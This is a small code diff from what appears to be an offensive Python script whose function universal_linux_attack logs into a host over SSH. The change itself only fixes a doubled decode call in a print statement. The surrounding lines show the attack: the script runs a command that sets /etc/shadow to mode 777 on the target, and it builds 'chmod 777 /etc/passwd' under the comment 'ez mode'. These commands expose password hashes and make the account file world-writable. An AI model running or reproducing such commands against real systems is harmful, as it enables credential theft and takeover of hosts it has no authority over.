@@ -126,7 +126,7 @@ def universal_linux_attack(host):
     print("Setting permissions to 777 on /etc/shadow on {}".format(host.ip))
     ssh.sendline(shadow_perms_cmd)
     ssh.prompt()
-    print(ssh.before.decode('utf8').decode('utf8'))
+    print(ssh.before.decode('utf8'))
     
     # ez mode /etc/passwd
     passwd_perms_cmd = "chmod 777 /etc/passwd"
